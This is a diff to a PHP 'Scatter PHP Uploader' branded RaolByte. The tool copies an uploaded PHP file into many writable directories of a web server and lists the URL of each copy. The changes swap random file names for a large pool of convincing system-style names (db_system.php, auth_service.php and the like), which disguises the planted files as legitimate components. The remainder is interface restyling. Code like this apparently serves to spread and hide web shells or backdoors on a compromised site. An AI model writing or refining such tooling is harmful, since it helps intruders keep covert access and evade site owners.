@@ -51,11 +51,66 @@ function ensureDirWritable(string $dir): bool {
     return is_dir($dir) && is_writable($dir);
 }
 
-function generateSystemLikePhpName(): string {
-    $prefixes = ['sys', 'system', 'svc', 'daemon', 'service'];
-    $prefix = $prefixes[random_int(0, count($prefixes) - 1)];
-    $token = bin2hex(random_bytes(4)); // 8 hex chars
-    return $prefix . '_' . $token . '.php';
+function ensureUniqueFilename(string $dir, string $basename): string {
+    $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;
+    if (!file_exists($target)) {
+        return $basename;
+    }
+    $pathInfo = pathinfo($basename);
+    $name = $pathInfo['filename'] ?? $basename;
+    $ext = isset($pathInfo['extension']) && $pathInfo['extension'] !== '' ? '.' . $pathInfo['extension'] : '';
+    $i = 1;
+    do {
+        $candidate = $name . '_' . $i . $ext;
+        $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
+        if (!file_exists($target)) {
+            return $candidate;
+        }
+        $i++;
+    } while (true);
+}
+
+function buildHumanSystemNamePool(int $needed): array {
+    // Generate deterministic, human-like names such as db_system.php, auth_service.php, etc.
+    $prefixes = [
+        'db','auth','cache','session','config','core','kernel','service','task','queue','cron','log','audit','backup','sync','mail',
+        'api','user','admin','client','device','network','payment','order','product','catalog','inventory','report','stats','billing',
+        'shipping','geo','image','file','upload','download','import','export','web','http','socket','stream','worker','job','scheduler',
+        'monitor','health','status','security','token','oauth','sso','ldap','crypto','hash','ssl','tls','dns','ip','proxy','cdn','renderer',
+        'pdf','doc','excel','csv','xml','json','yaml','parser','validator','sanitizer','filter','firewall','sandbox','docker','k8s','cluster',
+        'node','replica','shard','index','search','engine','recommend','ml','ai','vision','audio','video','encoder','decoder','transcoder',
+        'thumbnail','optimizer','compressor','notifier','webhook','callback','event','bus','broker','mq','kafka','rabbit','redis','memcache',
+        'mysql','pgsql','sqlite','mongo','elastic','clickhouse','s3','gcs','azure','minio','restore','migrate','seed','init','setup','install',
+        'upgrade','update','patch','hotfix','diagnostic','debug','trace','profile','benchmark','feature','flag','rollout','rollback','toggle',
+        'access','permission','role','policy','rule','quota','limit','throttle','rate','balance','autoscale','replication','discovery','registry',
+        'gateway','ingress','egress','edge','router','balancer','waf','websocket','grpc','rpc','rest','graphql','server','handler','controller',
+        'manager','helper','util','cli','daemon','agent','watcher','observer','collector','crawler','scraper','indexer','aggregator','merger',
+        'splitter','matcher','resolver','normalizer','enricher','analyzer','detector','classifier','segmenter','forecaster','trainer','tester',
+        'evaluator','reporter','printer','mailer','sms','push','notification','inbox','outbox','listener','subscriber','publisher','producer',
+        'consumer','dispatcher'
+    ];
+    $suffixes = [
+        'system','service','manager','controller','handler','module','engine','daemon','worker','helper','client','server','core','kernel',
+        'config','adapter','bridge','gateway','router','logger','monitor','scheduler','validator','parser','loader','resolver','registry',
+        'factory','builder','executor','runner','processor','pipeline','queue','cache','storage','backup','sync','scanner','watcher','observer'
+    ];
+
+    $names = [];
+    foreach ($prefixes as $p) {
+        foreach ($suffixes as $s) {
+            $names[] = $p . '_' . $s;
+            if (count($names) >= $needed) {
+                return array_map(fn($n) => $n . '.php', $names);
+            }
+        }
+    }
+    // If still fewer than needed, append numbered variants deterministically
+    $i = 1;
+    while (count($names) < $needed) {
+        $names[] = 'system_module_' . $i;
+        $i++;
+    }
+    return array_map(fn($n) => $n . '.php', $names);
 }
 
 function detectBaseUrl(): string {
@@ -141,18 +196,20 @@ if ($method === 'POST') {
         $baseUrl = detectBaseUrl();
         $webRoot = $defaults['webRoot'];
 
+        // Prepare a human name pool (>= number of selected dirs)
+        $namePool = buildHumanSystemNamePool(count($selected));
+        $nameIdx = 0;
+
         foreach ($selected as $dir) {
             if (!ensureDirWritable($dir)) {
                 $skipped[] = ['dir' => $dir, 'reason' => 'Folder tidak writable'];
                 continue;
             }
-            // Ensure unique randomized name per folder
-            $i = 0;
-            do {
-                $candidate = generateSystemLikePhpName();
-                $targetPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidate;
-                $i++;
-            } while (file_exists($targetPath) && $i < 10);
+            // Use deterministic human-like name, ensure unique within the directory
+            $baseName = $namePool[$nameIdx] ?? ('system_module_' . ($nameIdx + 1) . '.php');
+            $nameIdx++;
+            $fileName = ensureUniqueFilename($dir, $baseName);
+            $targetPath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
 
             if (@copy($tmpPath, $targetPath)) {
                 $url = pathToUrl($targetPath, $webRoot, $baseUrl);
@@ -184,27 +241,74 @@ if ($method === 'POST') {
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Scatter PHP Uploader (Auto Base URL)</title>
+  <title>Scatter PHP Uploader · by RaolByte</title>
   <style>
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 24px; line-height: 1.45; }
-    .card { border: 1px solid #ddd; border-radius: 8px; padding: 16px; max-width: 980px; }
+    :root {
+      --bg: #0b0f1a; /* deep blue-black */
+      --card: #0f1629;
+      --muted: #8aa0b5;
+      --text: #e8eef5;
+      --accent: #6ea8fe; /* RaolByte blue */
+      --accent-2: #22d3ee; /* cyan */
+      --border: #1f2a44;
+      --success: #22c55e;
+      --danger: #ef4444;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body {
+      margin: 0; padding: 24px; line-height: 1.5; font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+      color: var(--text); background: radial-gradient(1200px 600px at 20% -10%, rgba(110,168,254,0.15), transparent 60%),
+               radial-gradient(1000px 500px at 120% 10%, rgba(34,211,238,0.1), transparent 60%), var(--bg);
+    }
+    .container { max-width: 1100px; margin: 0 auto; }
+    .brand {
+      display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px;
+    }
+    .brand h1 { font-size: 22px; margin: 0; letter-spacing: 0.3px; }
+    .badge { color: var(--accent-2); font-weight: 600; font-size: 13px; }
+    .card {
+      border: 1px solid var(--border); border-radius: 16px; padding: 18px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.0));
+      box-shadow: 0 10px 30px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.03);
+    }
     .row { margin-bottom: 12px; }
-    label { display: block; font-weight: 600; margin-bottom: 6px; }
-    input[type=text], input[type=number] { width: 100%; padding: 8px; }
-    input[type=file] { padding: 6px 0; }
+    label { display: block; font-weight: 600; margin-bottom: 6px; color: var(--text); }
+    input[type=text], input[type=number], input[type=file] {
+      width: 100%; padding: 10px 12px; border-radius: 10px; border: 1px solid var(--border); background: #0b1220; color: var(--text);
+      outline: none; transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+    input[type=text]:focus, input[type=number]:focus, input[type=file]:focus {
+      border-color: var(--accent); box-shadow: 0 0 0 3px rgba(110,168,254,0.15);
+    }
     .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 12px; }
-    .btn { background: #0d6efd; color: #fff; border: none; padding: 10px 14px; border-radius: 6px; cursor: pointer; }
-    table { border-collapse: collapse; width: 100%; font-size: 13px; }
-    th, td { border: 1px solid #ddd; padding: 6px 8px; text-align: left; }
-    th { background: #fafafa; }
-    code { background: #f6f8fa; padding: 2px 4px; border-radius: 4px; }
+    .btn {
+      background: linear-gradient(90deg, var(--accent), #4f80ff); color: #001223; border: none; padding: 12px 16px; border-radius: 12px; cursor: pointer;
+      font-weight: 700; letter-spacing: 0.2px; box-shadow: 0 8px 20px rgba(110,168,254,0.25);
+    }
+    .btn:hover { filter: brightness(1.05); }
+    table { border-collapse: collapse; width: 100%; font-size: 13px; overflow: hidden; border-radius: 12px; }
+    th, td { border: 1px solid var(--border); padding: 8px 10px; text-align: left; }
+    th { background: #101a2f; color: var(--muted); }
+    code { background: #0d162a; padding: 2px 6px; border-radius: 6px; color: #b7c6d9; }
     details { margin-top: 10px; }
-    summary { cursor: pointer; font-weight: 600; }
+    summary { cursor: pointer; font-weight: 700; color: var(--accent-2); }
+    .muted { color: var(--muted); font-size: 12px; }
+    .footer { margin-top: 14px; color: var(--muted); font-size: 12px; text-align: center; }
+    @media (max-width: 640px) {
+      body { padding: 16px; }
+      .btn { width: 100%; }
+      th:nth-child(3), td:nth-child(3) { display: none; } /* hide path column on small screens */
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Upload & Tebar File PHP (Auto Base URL)</h2>
+  <div class="container">
+    <div class="brand">
+      <h1>Scatter PHP Uploader</h1>
+      <div class="badge">by RaolByte</div>
+    </div>
+    <div class="card">
+    <h2 style="margin-top:0">Upload & Tebar File PHP (Auto Base URL)</h2>
     <form method="post" enctype="multipart/form-data">
       <div class="row">
         <label for="upload">File .php</label>
@@ -303,6 +407,8 @@ if ($method === 'POST') {
         </details>
       <?php endif; ?>
     <?php endif; ?>
+    </div>
+    <div class="footer">© <?php echo date('Y'); ?> RaolByte. Built with ❤️</div>
   </div>
 
   <details style="margin-top:16px;">
